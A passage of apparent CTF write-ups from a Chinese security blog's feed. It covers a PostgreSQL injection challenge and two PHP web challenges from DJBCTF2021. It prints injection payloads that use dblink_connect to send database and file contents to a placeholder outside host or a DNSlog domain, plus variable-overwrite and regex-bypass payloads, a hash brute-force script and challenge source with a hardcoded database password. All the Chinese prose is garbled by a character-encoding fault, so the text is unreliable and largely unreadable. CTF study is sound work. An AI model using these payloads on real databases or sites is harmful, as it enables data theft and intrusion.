¼(chr(32))å³å¯æ˜æ–‡è¯»å–</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT replace(replace(substring(convert_from(lo_get(16440),&#39;utf8&#39;),1,900),chr(10),&#39;&#39;),chr(32),&#39;&#39;)) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202004121305.png" class="" title="index" loading="lazy"><p>å½“ç„¶çœ‹ä¸æ¸…å¯ä»¥base64è¯»å–è‡ªå·±è½¬</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;||(SELECT replace(substring(encode(lo_get(16440),&#39;base64&#39;),1,900),chr(10),&#39;&#39;)))) --</code></pre><img src="/article/cqb2021/image-20210201200655345.png" class="" title="base64index" loading="lazy"><p>å¾—åˆ°<code>index.php</code>æºç </p><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);session_start();function is_mobile()&#123;    if (isset ($_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;        $clientkeywords &#x3D; array(            &#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;        );        if (preg_match(&quot;&#x2F;(&quot; . implode(&#39;|&#39;, $clientkeywords) . &quot;)&#x2F;i&quot;, strtolower($_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;            return true;        &#125;    &#125;    return false;&#125;if (!is_mobile()) &#123;    die(&quot;&lt;!--function is_mobile()&#123;--&gt;&lt;!--if (isset (\$_SERVER[&#39;HTTP_USER_AGENT&#39;])) &#123;--&gt;&lt;!--\$clientkeywords &#x3D; array(--&gt;&lt;!--&#39;nokia&#39;,&#39;sony&#39;,&#39;ericsson&#39;,&#39;mot&#39;,&#39;samsung&#39;,&#39;htc&#39;,&#39;sgh&#39;,&#39;lg&#39;,&#39;sharp&#39;,&#39;sie-&#39;,&#39;philips&#39;,&#39;panasonic&#39;,&#39;alcatel&#39;,&#39;lenovo&#39;,&#39;iphone&#39;,&#39;ipod&#39;,&#39;blackberry&#39;,&#39;meizu&#39;,&#39;android&#39;,&#39;netfront&#39;,&#39;symbian&#39;,&#39;ucweb&#39;,&#39;windowsce&#39;,&#39;palm&#39;,&#39;operamini&#39;,&#39;operamobi&#39;,&#39;openwave&#39;,&#39;nexusone&#39;,&#39;cldc&#39;,&#39;midp&#39;,&#39;wap&#39;,&#39;mobile&#39;--&gt;&lt;!--);--&gt;&lt;!--&#x2F;&#x2F;ÂHTTP_USER_AGENTÂ¸Â­Â—--&gt;&lt;!--if (preg_match(\&quot;&#x2F;(\&quot; . implode(&#39;|&#39;, \$clientkeywords) . \&quot;)&#x2F;i\&quot;, strtolower(\$_SERVER[&#39;HTTP_USER_AGENT&#39;]))) &#123;--&gt;&lt;!--return true;--&gt;&lt;!--&#125;--&gt;&lt;!--&#125;--&gt;&lt;!--return false;--&gt;&lt;!--&#125;--&gt;&quot;);&#125;$user_input &#x3D; $_GET[&#39;f&#39;];if ($_SESSION[&quot;sql_injection&quot;]) &#123;    $user_input2 &#x3D; $_SESSION[&quot;sql_injection&quot;];    if(preg_match(&quot;&#x2F;dblink&#x2F;i&quot;, $user_input2)) &#123;        if(preg_match(&quot;&#x2F;host&#x2F;i&quot;, $user_input2)) &#123;            $limit &#x3D; 1;        &#125;        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(connect_timeout ?&#x3D;)&#x2F;i&#39;, &#39;&#39;, $user_input);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(host&#x3D;)&#x2F;i&#39;, &#39;connect_timeout&#x3D;2 host&#x3D;&#39;, $user_input);&#x2F;&#x2F;        hack for tcpdump ,only dns        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(user&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);        $user_input2 &#x3D; preg_replace(&#39;&#x2F;(password&#x3D;\&#39;)&#x2F;i&#39;, &#39;hack&#39;, $user_input2);    &#125;    $dbconn &#x3D; pg_connect(&quot;host&#x3D;127.0.0.1 port&#x3D;5432 dbname&#x3D;docker_db user&#x3D;docker password&#x3D;aYRr45lTgN9I9LJcjcr0&quot;);    pg_query($dbconn, &quot;SET statement_timeout TO 0&quot;);    pg_query($dbconn, &quot;SET idle_in_transaction_session_timeout TO 20&quot;);    pg_query($dbconn, &quot;SET lock_timeout TO 20&quot;);    $sql &#x3D; &quot;SELECT * FROM searches WHERE search &#x3D; &#39;&quot;.$user_input2.&quot;&#39;&quot;;    try &#123;        if (pg_prepare($dbconn, &quot;my_query&quot;, $sql)) &#123;            $start &#x3D; microtime(true);            pg_send_query($dbconn, $sql);            $error &#x3D; 0;        &#125; else &#123;            pg_send_query($dbconn, &quot;SELECT id FROM searches WHERE search &#x3D; &#39;0&#39;&quot;);            $error &#x3D; 1;        &#125;    &#125; catch (Exception $e) &#123;        &#x2F;&#x2F; Do nothing    &#125;&#125;$_SESSION[&quot;sql_injection&quot;] &#x3D; $user_input;?&gt;</code></pre><p>å¥½åƒæ²¡å•¥ï¼Œæ ¹æ® <code>hintï¼šä¸æ˜¯æ‰€æœ‰sqléƒ½å«PostgreSQLï¼›flagåœ¨webç›®å½•ä¸‹çš„æŸä¸ªæ–‡ä»¶é‡Œã€‚</code> ç¡®å®šï¼Œå…³é”®æ–‡ä»¶è‚¯å®šåœ¨è¿™é‡Œï¼Œäºæ˜¯ç»§ç»­å°è¯•ï¼Œè¯»åˆ°äº†<code>.hatccess</code>ï¼ŒåŒ…å«ä¸€ä¸‹ï¼Œå†è¯»ä¸€ä¸‹</p><p><code>.htaccess</code></p><pre class="language-none"><code class="language-none">&lt;FilesMatch &quot;pushF1n4AnK&quot;&gt;  SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;AddType image&#x2F;jpeg .tank</code></pre><p>å¯ç–‘æ–‡ä»¶<code>pushF1n4AnK</code>ï¼Œè¯»ä¸€ä¸‹</p><img src="/article/cqb2021/image-20210201201204964.png" class="" title="flag" loading="lazy"><p>è‡³æ­¤é¢˜ç›®ç»“æŸäº†</p><p>æœ€åè¯´ä¸€ä¸‹æ³¨å…¥ç‚¹çš„é—®é¢˜</p><h3 id="æ³¨å…¥ç‚¹"><a href="#æ³¨å…¥ç‚¹" class="headerlink" title="æ³¨å…¥ç‚¹"></a>æ³¨å…¥ç‚¹</h3><h4 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h4><p>å¯¹äºDNSlogï¼Œæ³¨å…¥ç‚¹åœ¨hostï¼Œå³<code>... host=&#39;|| (query) ||&#39;.xxxx.ceye.io ...</code>ï¼Œä¸Šé¢å·²è§£é‡Šè¿‡</p><h4 id="æ•°æ®åº“å¤–è”"><a href="#æ•°æ®åº“å¤–è”" class="headerlink" title="æ•°æ®åº“å¤–è”"></a>æ•°æ®åº“å¤–è”</h4><p>æ³¨å…¥ç‚¹åœ¨æ˜æ–‡ä¼ è¾“çš„éƒ¨åˆ†ï¼Œå³<code>... user=&#39;|| (query) ||&#39;...</code>å’Œ<code>... dbname=&#39;||(query) &#39;</code>æœ€åä¸éœ€è¦<code>|</code>è¿æ¥ç¬¦ï¼Œå› ä¸ºæ²¡æœ‰ä¸œè¥¿åŠ äº†ä¼šæŠ¥é”™</p><p>ä¸¾ä¾‹ï¼Œä¾‹å¦‚åœ¨è·å–æ‰€æœ‰å¤§å¯¹è±¡oidæ—¶ï¼Œåœ¨<code>user</code>å¤„æ³¨ï¼Œå¦‚å›¾æ‰€ç¤º</p><img src="/article/cqb2021/image-20210202021430433.png" class="" title="inject" loading="lazy"><pre class="language-none"><code class="language-none">user.xxxx.database.postgres</code></pre><p>å³<code>user</code>å’Œ<code>dbname</code>å¤„éƒ½æ˜¯æ˜æ–‡ä¼ è¾“çš„éƒ½å¯ä»¥æ³¨ï¼Œè€Œpasswordä¸è¡Œ</p><h2 id="æ„Ÿè°¢"><a href="#æ„Ÿè°¢" class="headerlink" title="æ„Ÿè°¢"></a>æ„Ÿè°¢</h2><p>æ„Ÿè°¢ <a href="https://ha1c9on.top/">@HA1C9ON</a> å¤§ä½¬çš„æ•™å¯¼ï¼Œæ„Ÿè°¢ @egg å¸ˆå‚…çš„æŒ‡å¯¼ï¼Œä»¥åŠå’Œ @R1chm0nd å¸ˆå‚…èµ›åè®¨è®ºæŒ‡æ­£payloadä¸­<code>user=&#39; || (query) || &#39;</code>çš„<code>|</code>æˆ–ç¬¦åˆå…¶å®æ˜¯è¿æ¥ç¬¦ï¼Œå­¦ä¹ äº†ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md">https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md</a></p><p><a href="https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true">https://zhuanlan.zhihu.com/p/78908281?from_voters_page=true</a></p><p><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration">https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration</a></p><p><a href="https://balsn.tw/ctf_writeup/20190603-facebookctf/">https://balsn.tw/ctf_writeup/20190603-facebookctf/</a></p><p><a href="https://ha1c9on.top/2021/01/31/2021-cqb-write-up/">https://ha1c9on.top/2021/01/31/2021-cqb-write-up/</a> laä½¬åšå®¢ï¼Œå¸Œæœ›èƒ½å’Œå¸ˆå‚…ä¸€æ ·å¼ºï¼Œèƒ½å’Œå¸ˆå‚…æ¢å‹é“¾</p><p><a href="https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed">https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed</a> (å†™udfçš„ï¼Œæ²¡ç”¨ä¸Š2333)</p><p><a href="http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY">http://www.postgres.cn/docs/9.4/functions-datetime.html#FUNCTIONS-DATETIME-DELAY</a></p><p><a href="https://www.postgresql.org/docs/11/dblink.html">https://www.postgresql.org/docs/11/dblink.html</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;åªåšäº†ä¸€é“é¢˜ï¼ŒæŒ‰Fæ³¨å…¥ï¼Œç ”ç©¶äº†pgsqlï¼Œç®—ä¸ªå°ç¬”è®°ï¼Œä¸èƒ½ç®—ç ”ç©¶æ€§æ–‡ç« &lt;/p&gt;</summary>
    
    
    
    <category term="Write-Up" scheme="https://err0r.top/categories/Write-Up/"/>
    
    
    <category term="SQL" scheme="https://err0r.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>DJBCTF2021</title>
    <link href="https://err0r.top/article/djbctf2021/"/>
    <id>https://err0r.top/article/djbctf2021/</id>
    <published>2021-01-24T16:36:11.000Z</published>
    <updated>2021-03-30T11:51:42.085Z</updated>
    
    <content type="html"><![CDATA[<p>2021ç¬¬ä¸€åœºæ¯”èµ›</p><p>æ˜µç§°ï¼šåˆ«ç­”äº†åˆ«ç­”äº†å†ç­”äººå‚»äº†</p><a id="more"></a><p>DJBctfï¼Œå­©å­å¤ªèœäº†å‘œå‘œå‘œ</p><p>åšäº†ä¸¤é“webï¼Œç­¾åˆ°é¢˜æœ‰éé¢„æœŸ(æ±—)ï¼Œåˆ†æä¸‹é¢„æœŸå’Œéé¢„æœŸè§£æ³•ï¼ŒåŠ ä¸Šäº›ä¸ªäººçš„ç†è§£</p><p>æœ¬Webç‹—ä½•å¾·ä½•èƒ½ï¼Œå°è¯•åšäº†ä¸€é“å¯†ç å­¦â€¦èµ›åæ‰ç»ˆäºå‡ºäº†ã€‚</p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="veryphp"><a href="#veryphp" class="headerlink" title="veryphp"></a>veryphp</h3><p>æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">qwq</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Access Denied!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">oao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\`|\_|\.|%|\*|\~|\^|\'|\"|\;|\(|\)|\]|g|e|l|i|\//is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^\-[a-e][^a-zA-Z0-8]&lt;b>(.*)>&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$/'</span><span class="token punctuation">,</span> <span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$shaw_root</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">29</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Almost there."</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"Input correct parameters"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ans</span><span class="token operator">===</span><span class="token variable">$SecretNumber</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"Congratulations!"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$my_ans</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>æœ‰ä¸€ä¸ªç±»ï¼Œå¯èƒ½æ˜¯ååºåˆ—åŒ–ï¼Œä½†çœ‹åˆ°æœ€å<code>call_user_func</code>ï¼Œç±»é‡Œé¢è¿˜æœ‰ä¸ªstaticå‡½æ•°ï¼Œåº”è¯¥æ˜¯ç›´æ¥è°ƒç”¨äº†ã€‚</p><p>çœ‹é€»è¾‘ï¼Œ<code>php://input</code>ï¼Œå˜é‡<code>str</code>ä»POSTåŸå§‹æµè¯»å–æ•°æ®ï¼Œè¿‡æ»¤åå˜é‡è¦†ç›–ã€‚ç„¶åä¼ å…¥<code>shaw_root</code>ï¼Œæ»¡è¶³æ¡ä»¶ä¼šç»™hintï¼Œæœ€å<code>$ans===$SecretNumber</code>å³å¯è°ƒç”¨å‡½æ•°äº†ã€‚</p><hr><p>é¦–å…ˆä¼ <code>shaw_root</code>ï¼Œç¬¬ä¸€ä¸ªç‚¹åœ¨è¿‡æ»¤äº†<code>_</code>ï¼Œæ ¹æ®PHPç‰¹æ€§ï¼Œ<code>ç©ºæ ¼</code>ï¼Œ<code>.</code>ä¼ é€’æœ€åéƒ½ä¼šè½¬å˜ä¸º<code>-</code></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œæ­¤ä¸ºweb3çš„è°ƒè¯•ï¼Œä¸æœ¬é¢˜æ­¤è€ƒç‚¹ä¸€è‡´</p><img src="/article/djbctf2021/image-20210128164708984.png" class="" title="image-20210128164708984" loading="lazy"><img src="/article/djbctf2021/image-20210128164811979.png" class="" title="image-20210128164811979" loading="lazy"><p>ä¼ å…¥ç©ºæ ¼ï¼Œ<code>.</code>éƒ½å˜æˆäº†<code>_</code></p><p>æ¥ä¸‹æ¥å°±æ˜¯ç»•æ­£åˆ™äº†ï¼Œå»regex101è°ƒäº†åŠå¤©(æ²¡å­¦æ­£åˆ™çš„æ‡’ç‹—â€”â€“&gt;æˆ‘)ï¼Œè°ƒäº†ä¸€ä¸ªpayload</p><img src="/article/djbctf2021/image-20210128165252056.png" class="" title="image-20210128165252056" loading="lazy"><p><code>-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra</code></p><p>ä¼ å…¥å¾—</p><img src="/article/djbctf2021/image-20210128165654959.png" class="" title="image-20210128165654959" loading="lazy"><pre class="language-none"><code class="language-none">Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)&#x3D;&#x3D;166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)&#x3D;&#x3D;&#x3D;5</code></pre><p>å†™è„šæœ¬çˆ†ç ´,è„šæœ¬å¦‚ä¸‹</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ï¼š 2021/1/23 16:58@Auth ï¼š gyy@Blog ï¼šhttp://err0r.top"""</span><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">MD5</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> <span class="token number">10000</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        text <span class="token operator">=</span> <span class="token string">"shaw&#123;&#125;root"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span>m<span class="token punctuation">)</span>        m <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>        <span class="token keyword">if</span> m <span class="token operator">==</span> target <span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nfind it:'</span><span class="token punctuation">,</span>text<span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span>m<span class="token punctuation">)</span>            <span class="token keyword">break</span>        i <span class="token operator">+=</span><span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    MD5<span class="token punctuation">(</span><span class="token string">'166b47a5cb1ca2431a0edfcef200684f'</span><span class="token punctuation">)</span></code></pre><p>çˆ†ç ´å¾—<code>shaw21475root</code></p><img src="/article/djbctf2021/image-20210128170204123.png" class="" title="image-20210128170204123" loading="lazy"><p>ä¼ å…¥æˆåŠŸ</p><img src="/article/djbctf2021/image-20210128170309356.png" class="" title="image-20210128170309356" loading="lazy"><p>è¡¨æ˜æˆåŠŸäº†ï¼Œæœ€åä¸€æ­¥è°ƒç”¨å‡½æ•°ï¼Œæ ¹æ®PHPæ–‡æ¡£ï¼Œç±»staticå‡½æ•°å¯ä»¥ç›´æ¥ç”¨<code>class::static function</code>è°ƒç”¨ï¼Œè¯¦æƒ…è§<a href="https://www.php.net/manual/zh/function.call-user-func.php">å®˜æ–¹æ–‡æ¡£</a></p><p>æœ€ç»ˆpayload:<code>shaw root=-a9&lt;b&gt;a\n\n&gt;&gt;&gt;&gt;&gt;&gt;abcccphp@Rra&amp;&amp;ans=21475&amp;&amp;my ans=qwq::oao</code></p><img src="/article/djbctf2021/image-20210128170748201.png" class="" title="image-20210128170748201" loading="lazy"><p>è¿™é‡Œè¦æ³¨æ„ï¼Œå¦‚æœç”¨HackBarå‘åŒ…çš„è¯è¦æ¢æ¨¡å¼</p><img src="/article/djbctf2021/image-20210128170832793.png" class="" title="image-20210128170832793" loading="lazy"><p>å› ä¸ºè½¬ä¹‰æ˜¯é˜»æŒ¡ä½ å‰è¿›æ­¥ä¼çš„ä¸€å¤§å…ƒå‡¶</p><h4 id="é¢˜ç›®æ€è€ƒ"><a href="#é¢˜ç›®æ€è€ƒ" class="headerlink" title="é¢˜ç›®æ€è€ƒ"></a>é¢˜ç›®æ€è€ƒ</h4><p>å› ä¸ºå˜é‡è¦†ç›–ï¼Œç›´æ¥æŠŠ<code>SecretNumber</code>è¦†ç›–å°±è¡Œäº†ï¼Œæœ¬é¢˜åœ¨<code>str</code>å¤„æœ‰ä¸ªè¿‡æ»¤<code>e</code>ï¼Œæ‰€ä»¥ä¸è¡Œ</p><p><code>php://input</code>è¯»å…¥åŸå§‹æµæ•°æ®ï¼Œæ‰€ä»¥å–åå¼‚æˆ–è½¬ä¹‰ä¹‹ç±»çš„æ–¹æ³•éƒ½æ˜¯ä¸è¡Œçš„</p><hr><h3 id="spaceman"><a href="#spaceman" class="headerlink" title="spaceman"></a>spaceman</h3><p>Webç­¾åˆ°é¢˜(å¤§æ¦‚)ï¼Œæºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">spaceman</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token operator">===</span><span class="token single-quoted-string string">'ctfshowvip'</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token single-quoted-string string">'wrong password'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'ctfshowup'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ctfshow'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/\_|\.|\]|\[/is'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I am sorry but you have to leave."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">spaceman</span><span class="token punctuation">(</span><span class="token variable">$user_name</span><span class="token punctuation">,</span><span class="token variable">$pass_word</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>æ ‡å‡†ååºåˆ—åŒ–é•¿åº¦é€ƒé€¸ï¼Œå¯æƒœéé¢„æœŸäº†</p><h4 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h4><p>çœ‹<code>spaceman</code>ç±»ï¼Œä¸¤ä¸ªå˜é‡ç”±é­”æœ¯æ–¹æ³•<code>__construct</code>èµ‹å€¼ï¼Œ<code>filter</code>å‡½æ•°æ›¿æ¢å­—ç¬¦ä¸²ï¼ŒåŸºæœ¬ä¸Šå°±ç¡®å®šæœ¬é¢˜æ˜¯ååºåˆ—åŒ–é•¿åº¦é€ƒé€¸äº†ã€‚</p><p>åŒæ ·ï¼Œ<code>php://input</code>è¯»å–åŸå§‹æµæ•°æ®å˜é‡è¦†ç›–ï¼Œç»•è¿‡æ–¹æ³•åŒweb1ï¼Œæ„é€ 